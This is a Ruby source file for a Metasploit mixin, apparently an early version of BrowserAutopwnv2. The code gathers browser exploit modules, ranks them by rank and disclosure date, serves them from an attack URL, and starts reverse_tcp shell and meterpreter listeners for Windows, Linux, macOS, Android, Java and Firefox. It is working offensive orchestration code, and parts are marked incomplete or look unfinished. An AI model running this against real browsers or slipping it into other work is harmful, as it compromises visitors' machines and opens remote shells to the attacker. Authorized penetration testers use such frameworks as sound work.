###
#
# The Msf::Exploit::Remote::BrowserAutopwnv2 mixin is a replacement for the current BrowserAutoPwn
#
###

require 'Date'

module Msf
  module Exploit::Remote::BrowserAutopwnv2

    # Exception specific for Msf::Exploit::Remote::BrowserAutopwnv2
    class BAPv2Exception < RuntimeError; end

    include Msf::Exploit::Remote::BrowserExploitServer

    # @return [Array] A list of initialized BAP exploits
    attr_reader :bap_exploits


    # The default platform-specific payloads and preferred LPORTS.
    # The hash key is the name of the platform that matches what's on the module.
    # The loader order is specific.
    DEFAULT_PAYLOADS = {
      'firefox' => { 'payload' => 'firefox/shell_reverse_tcp',         'lport' => 4449 },
      'android' => { 'payload' => 'android/meterpreter/reverse_tcp',   'lport' => 4448 },
      'win'     => { 'payload' => 'windows/meterpreter/reverse_tcp',   'lport' => 4444 },
      'linux'   => { 'payload' => 'linux/x86/meterpreter/reverse_tcp', 'lport' => 4445 },
      'osx'     => { 'payload' => 'osx/x86/shell_reverse_tcp',         'lport' => 4446 },
      'java'    => { 'payload' => 'java/meterpreter/reverse_tcp',      'lport' => 4447 },
      'generic' => { 'payload' => 'generic/shell_reverse_tcp',         'lport' => 4450 }
    }


    def is_browse_autopwn?
      true
    end


    # Returns all the found exploit modules that support BrowserExploitServer by going through all
    # the exploits from the framework object.
    #
    # @return [void]
    def init_exploits
      # First we're going to avoid using #find_all because that gets very slow.
      framework.exploits.each_pair do |fullname, plader_holder|
        next if !fullname.include?('browser') || self.fullname == "exploit/#{fullname}"

        # Regex search
        next if datastore['Include'] && fullname !~ datastore['Include']

        mod = framework.exploits.create(fullname)
        unless mod
          print_status("Failed to load: #{fullname}")
          next
        end
        if mod.kind_of?(Msf::Exploit::Remote::BrowserExploitServer)
          set_exploit_options(mod)
          @bap_exploits << mod
        end
      end
    end


    # Modifies an exploit's default datastore options.
    #
    # @return [void]
    def set_exploit_options(xploit)
      p = select_payload(xploit)
      xploit.datastore['DisablePayloadHandler'] = true            # BAP should handle the handlers
      xploit.datastore['PAYLOAD'] = p['payload']                  # We'll need this information later for multi handler
      xploit.datastore['LPORT']   = p['lport']                    # We'll need this information later for multi handler
      xploit.datastore['SSL'] = datastore['SSL']                  # Use SSL or not
      xploit.datastore['SSLVersion'] = datastore['SSLVersion']    # SSL Version
      xploit.datastore['LHOST'] = get_payload_lhost               # Attacker's IP
      xploit.datastore['URIPATH'] = "/#{assign_module_resource}"  # A unique resource URI for the exploit
      xploit.datastore['SRVHOST'] = datastore['SRVHOST']          # Exploit's host
      xploit.datastore['MODULEOWNER'] = Msf::Exploit::Remote::BrowserAutopwnv2 # Let other mixins know we're in BrowserAutoPwn mode
    end


    # Checks if a resource is already taken or not.
    #
    # @return [TrueClass] Resource is taken.
    # @return [FalseClass] Resource is not taken.
    def is_resource_taken?(resource)
      taken = false

      bap_exploits.each do |m|
        return true if m.datastore['URI'] == resource
      end

      taken
    end


    # Returns a unique resource path.
    #
    # @return [String] A unique resource path.
    def assign_module_resource
      resource = ''
      while
        resource = Rex::Text.rand_text_alpha(rand(10) + 4)
        break unless is_resource_taken?(resource)
      end

      resource
    end


    # Modifies @bap_exploits by sorting. The newest and with the highest ranking goes on top.
    #
    # @see #bap_exploits The read-only attribute.
    # @see #sort_date_in_group The method for sorting by disclosure date
    # @see #sort_group_by_rank The method for sorting by rank
    # @see #sort_bap_modules The method for breaking the module list into groups
    # @see #finalize_sorted_modules The method for finalizing bap_exploits
    # @return [void]
    def sort_bap_exploits
      bap_groups = group_bap_modules
      bap_groups = sort_date_in_group(bap_groups)
      bap_groups = sort_group_by_rank(bap_groups)
      finalize_sorted_modules(bap_groups)
    end


    # Sorts a grouped module list by disclosure date.
    #
    # @param [Hash] A grouped module list.
    # @return [Hash] A hash with each module list sorted by disclosure date.
    def sort_date_in_group(bap_groups)
      bap_groups.each_pair do |ranking, module_list|
        bap_groups[ranking] = module_list.sort_by {|m| Date.parse(m.disclosure_date.to_s)}.reverse
      end
    end


    # Sorts a module list by ranking.
    #
    # @param [Hash] A grouped module list.
    # @return [Hash] A hash grouped by ranking.
    def sort_group_by_rank(bap_groups)
      Hash[bap_groups.sort_by {|k,v| k}.reverse]
    end


    # Breaks @bap_exploits into groups for sorting purposes.
    #
    # @return [Hash] A module list grouped by rank.
    def group_bap_modules
      bap_groups = {}
      RankingName.each_pair do |ranking, value|
        bap_groups[ranking] = []
        bap_exploits.each do |m|
          next if m.rank != ranking
          bap_groups[ranking] << m
        end
      end
      bap_groups
    end


    # Modifies @bap_exploit by replacing it with the rearranged module list.
    #
    # @see #bap_exploits The read-only attribute.
    # @param [Hash] A grouped module list.
    # @return [void]
    def finalize_sorted_modules(bap_groups, max=20)
      @bap_exploits = []
      bap_groups.each_pair do |ranking, module_list|
        module_list.each do |m|
          break if @bap_exploits.length >= max
          @bap_exploits << m
        end
      end
    end


    def is_payload_handler_wanted?(payload_name)
      bap_exploits.each do |m|
        return true if m.datastore['PAYLOAD'] == payload_name
      end

      false
    end


    def get_selected_payload_name(platform)
      payload_name = datastore["PAYLOAD_#{platform.upcase}"]
      p = framework.payloads.create(payload_name)

      # The payload is legit, we can use it.
      return payload_name if p

      default = DEFAULT_PAYLOADS[platform]['payload']
      print_status("Unknown payload set: #{payload_name}. Falling back to: #{default}.")

      # The user has configured some unknown payload that we can't use,
      # fall back to default.
      default
    end

    def get_selected_payload_lport(platform)
      datastore["PAYLOAD_#{platform.upcase}_LPORT"]
    end


    def get_payload_lhost
      datastore['LHOST'] || Rex::Socket.source_address
    end


    # Creates payload listeners.
    #
    # @note INCOMPLETE
    # @return [void]
    def start_payload_listeners
      DEFAULT_PAYLOADS.each_pair do |platform, listener_info|
        # Exploit failed: firefox/shell_reverse_tcp is not a compatible payload
        next if listener_info['payload'] == 'firefox/shell_reverse_tcp'

        # Don't waste resources. This shaves about a second in loading speed.
        next unless is_payload_handler_wanted?(listener_info['payload'])

        multi_handler = framework.modules.create('exploit/multi/handler')
        multi_handler.datastore['LHOST'] = get_payload_lhost
        multi_handler.datastore['PAYLOAD'] = get_selected_payload_name(platform)
        multi_handler.datastore['LPORT'] = get_selected_payload_lport(platform)
        multi_handler.datastore['EXITONSESSION'] = false
        multi_handler.datastore['EXITFUNC'] = 'thread'
        multi_handler.datastore['MODULEOWNER'] = Msf::Exploit::Remote::BrowserAutopwnv2
        multi_handler.exploit_simple(
          'LocalInput' => self.user_input,
          'LocalOutput' => self.user_output,
          'Payload' => listener_info['payload'],
          'RunAsJob' => true
        )
      end
    end


    # Returns a list of suitable exploits for the current target.
    #
    # @param [Hash] Target's information such as the OS, browser, 3rd-party plugins, etc.
    # @return [Array] A list of suitable exploits to use against the target.
    def find_suitable_exploits(target_info)
      $stderr.puts target_info.inspect
    end


    def parse_rank(rank)
      rank_str = ''

      case rank
      when 0
        rank_str = 'Manual'
      when 100
        rank_str = 'Low'
      when 200
        rank_str = 'Average'
      when 300
        rank_str = 'Normal'
      when 400
        rank_str = 'Good'
      when 500
        rank_str = 'Great'
      when 600
        rank_str = 'Excellent'
      end

      rank_str
    end


    def select_payload(m)
      selected_payload = DEFAULT_PAYLOADS['generic']
      DEFAULT_PAYLOADS.each_pair do |p, info|
        preferred = info['payload']
        m.compatible_payloads.each do |k|
          return info if k[0] == preferred
        end
      end

      selected_payload
    end


    def start_exploits
      bap_exploits.each do |m|
        m.exploit_simple(
          'LocalInput'  => self.user_input,
          'LocalOutput' => self.user_output,
          'Target'      => 0,
          'Payload'     => m.datastore['PAYLOAD'],
          'RunAsJob'    => true
        )
      end
    end


    # Sets up BAPv2. This is like our main function.
    #
    # @see #init_exploits
    # @see #sort_bap_exploits
    # @return [void]
    def setup
      t1 = Time.now
      self.datastore['MODULEOWNER'] = Msf::Exploit::Remote::BrowserAutopwnv2
      self.datastore['DisablePayloadHandler'] = true
      super
      @bap_exploits = []

      print_status("Searching BES exploits, please wait...")
      init_exploits
      sort_bap_exploits

      print_status("Starting exploit modules...")
      start_exploits

      print_status("Starting listeners...")
      start_payload_listeners

      t2 = Time.now
      print_line
      print_status("Time spent: #{(t2-t1).inspect}")
    end


    def show_ready_exploits
      table = Rex::Ui::Text::Table.new(
        'Header'  => 'Exploits',
        'Indent'  => 1,
        'Columns' => ['Order', 'Rank', 'Name', 'Path', 'Payload']
      )

      # Without the order, sometimes the Rex table messes up even though in the array
      # the order looks right. So don't get rid of this.
      order = 1

      bap_exploits.each do |m|
        table << [
          order,
          parse_rank(m.rank),
          m.shortname,
          m.datastore['URIPATH'],
          "#{m.datastore['PAYLOAD']} on #{m.datastore['LPORT']}"
        ]
        order += 1
      end

      print_line
      print_status("The following is a list of exploits that BrowserAutoPwn will consider using.")
      print_status("Exploits with the highest ranking and newest will be tried first.")
      print_line
      print_line table.to_s
    end

    def start_service
      super
      show_ready_exploits
      print_status("Please use the following URL for the browser attack:")
      print_status("BrowserAutoPwn URL: #{self.get_uri}")
    end

    def show_payloads
      DEFAULT_PAYLOADS.keys.each do |platform|
        payload_name = get_selected_payload_name(platform)
        p = framework.payloads.create(payload_name)
        p.datastore['LHOST'] = get_payload_lhost
        p.datastore['LPORT'] = get_selected_payload_lport(platform)
        next unless p
        p_opt = Serializer::ReadableText.dump_options(p, '   ')
        print("\nPayload options (#{payload_name}):\n\n#{p_opt}\n") if (p_opt and p_opt.length > 0)
      end
    end

  end
end
